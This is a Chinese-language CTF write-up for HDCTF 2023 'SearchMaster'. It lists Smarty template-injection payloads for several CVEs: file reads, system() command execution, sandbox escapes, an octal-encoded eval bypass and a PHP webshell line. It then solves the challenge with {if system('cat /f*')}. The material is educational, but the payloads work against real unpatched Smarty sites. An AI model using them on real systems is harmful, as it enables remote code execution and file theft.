# [HDCTF 2023]SearchMaster

## 0、知识点

>   Smarty模版注入

>   Smarty是最流行的PHP模板语言之一

## 1、关于smarty漏洞



### 0、任意文件读取

-   版本限制无

-   漏洞成因：

    -   [{include}](https://www.smarty.net/docs/en/language.function.include.tpl) 标签所导致，被该标签引入的文件只会单纯的输出文件内容，就算引入 php 文件也是如此

-   payload：

    -   ```nginx
        string:{include file='C:/Windows/win.ini'}
        string:{include file='/flag'}
        string:{include file='index.php'}
        ```

### 1、CVE-2017-1000480

**测试代码**

```php
<?php
define('HOST_DIR', __DIR__ . '/../');
define('SMARTY_LIBS', HOST_DIR . '/vendor/smarty/libs/Smarty.class.php');
define('SMARTY_COMPILE_DIR', HOST_DIR . 'app/templates_c');
define('SMARTY_CACHE_DIR', HOST_DIR . 'app/cache');
require_once(SMARTY_LIBS);
class testSmarty extends Smarty_Resource_Custom{
	protectedfunction fetch($name, &$source, &$mtime){
        $template = "CVE-2017-1000480 smarty PHP code injection";
        $source = $template;
        $mtime = time();
	}
}
$smarty = new Smarty();
$smarty->registerResource('test', new testSmarty);
$smarty->display('test:'.$_GET['eval']);
?>
    
    # 我们可以利用 / / 或者 */ // 等方式来实现代码执行
    注入案例：
    	index.php?eval=*/phpinfo();/*
```



### 2、CVE-2021-26120（沙箱逃逸漏洞）

-   漏洞原因：[{function}](https://www.smarty.net/docs/en/language.function.function.tpl) 标签的 name 属性可以通过精心构造注入恶意代码

-   版本限制：**在 3.1.39 版本修复，小于 3.1.39 能用**

-   payload：

    -   ```nginx
        string:{function name='x(){};system(whoami);function '}{/function}
        string:{function name='x(){};system(cat /flag);function '}{/function}
        ```

### 3、CVE-2021-26119 (沙箱逃逸)

-   漏洞原因：可以通过` {$smarty.template_object} `**访问到 smarty 对象，然后执行任意命令**

-   版本限制：这个漏洞还没有被修复，最新版本 4.1.0 跟 3.1.44 都能注入恶意代码

-   payload：

    -   ```nginx
        # smarty对象中一些可以执行命令的函数
        string:{$smarty.template_object->smarty->_getSmartyObj()->display('string:{system(whoami)}')}
        string:{$smarty.template_object->smarty->enableSecurity()->display('string:{system(whoami)}')}
        string:{$smarty.template_object->smarty->disableSecurity()->display('string:{system(whoami)}')}
        string:{$smarty.template_object->smarty->addTemplateDir('./x')->display('string:{system(whoami)}')}
        string:{$smarty.template_object->smarty->setTemplateDir('./x')->display('string:{system(whoami)}')}
        string:{$smarty.template_object->smarty->addPluginsDir('./x')->display('string:{system(whoami)}')}
        string:{$smarty.template_object->smarty->setPluginsDir('./x')->display('string:{system(whoami)}')}
        string:{$smarty.template_object->smarty->setCompileDir('./x')->display('string:{system(whoami)}')}
        string:{$smarty.template_object->smarty->setCacheDir('./x')->display('string:{system(whoami)}')}
        
        string:{$s=$smarty.template_object->smarty}
        {$fp=$smarty.template_object->compiled->filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,"<?php+phpinfo();",$s)}
        ```

### 4、CVE-2021-29454

-   漏洞原因：`libs/plugins/function.math.php` 中的 `smarty_function_math` 执行了 eval()，
    -   而` eval() `的数据可以通过 8 进制数字绕过正则表达式
-   版本限制：在 3.1.42 和 4.0.2 中修复，小于这两个版本可用

-   payload:

    -   ```nginx
        eval:{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}
        
        # php 的 eval() 支持传入 8 或 16 进制数据，
        # 以下代码在 php7 版本都可以顺利执行，由于 php5 不支持 (system)(whoami);
        # 这种方式执行代码，所以 php5 的 8 进制方式用不了：
        eval('("\163\171\163\164\145\155")("\167\150\157\141\155\151");');
        eval("\x73\x79\x73\x74\x65\x6d\x28\x77\x68\x6f\x61\x6d\x69\x29\x3b");
        ```



### 5、**利用模板本身的特性进行攻击**

-   **利用本身的特性进行攻击的方式也就是指模板引擎中的各种标签**
    -   **标签为了实现功能，很多时候会进行命令执行等操作**，有时一些正常的功能也会被恶意利用而导致一系列的问题

-   ```nginx
    常用的参数值：
    {$smarty.version}		# 返回版本信息，有助于根据版本进行后续攻击手段的选择
    ${smarty.template}		# 返回当前模板的文件名，没用使用模板文件就会报错
    ```

-   **攻击方式**：

    -   **获取类的静态方法（适应于：旧版本， 3.1.30版本被删除）**

        -   ```nginx
            # 我们可以通过 self 标签来获取 Smarty 类的静态方法，
            # 比如我们可以获取 getStreamVariable() 方法来读文件，这里就可以进行尝试是否存在任意文件读取
            {self::getStreamVariable(“file:///etc/passwd”)}
            ```

    -   **{literal} 标签**

        -   ```nginx
            # {literal} 可以让一个模板区域的字符原样输出。
            # 这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析
            
            在 PHP5 环境下存在一种 PHP 标签， <script language=”php”></script>，
            我们便可以利用这一标签进行任意的 PHP 代码执行
            
            注入案例：
            	{literal}alert('xss');{/literal}
            	{literal}<script language='php'>eval($_POST['cmd']);</script>{/literal}
            ```

    -   **{if} 标签**

        -   ```nginx
            # Smarty 的 {if} 条件判断和 PHP 的 if 非常相似，
            # 只是增加了一些特性。每个 {if} 必须有一个配对的 {/if}，也可以使用 {else} 和 {elseif} ，
            全部的PHP条件表达式和函数都可以在 {if} 标签中使用。
            
            注入案例：
            {if phpinfo()}{/if}
            {if readfile ('/flag')}{/if}
            {if show_source('/flag')}{/if}
            {if system('cat /flag')}{/if}
            {if system('cat /f*')}{/if}
            {if system('ls /')}{/if}
            ```

    -   **{php} 标签（不常用，遇到了再去了解吧）**

        -   Smarty3 官方手册中明确表示已经废弃 `{php}` 标签，不建议使用。
        -   在 `Smarty3.1`， `{php}` 仅在 `SmartyBC` 中可用。



****

## 2、解题

-   **打开界面关键的一句是**
    -   `模板都一样我很抱歉OVO BUT YOU CAN POST ME A data`

-   意思是叫我们POST传入一个参数，参数名为：data
-   一般叫我们传入参数的情况下考察的可能会是：**命令执行、模版注入、sql注入**

>   **经过测试可以发现是模版注入，当我们赋值：`data={{7*7}}`时，页面返回并计算出7*7的值**

>   **继续进行测试判断属于哪种模版注入**

>   **通过输入`a{*comment*}b => ab`确定模板类型为Smarty，也是就说以`{**}` 为注释符就可以判断我们的模板为 Smarty 模板，当然传入一些奇怪的字符让它报错可以确认它为Smarty**

>   **输入`data={$smarty.version}`返回出Smarty的版本信息为：4.1.0**

>   **使用{if}标签可以直接获取到flag**

```
{if system('cat /f*')}{/if}
```





参考：

https://xz.aliyun.com/t/11108#toc-1

https://www.anquanke.com/post/id/272393
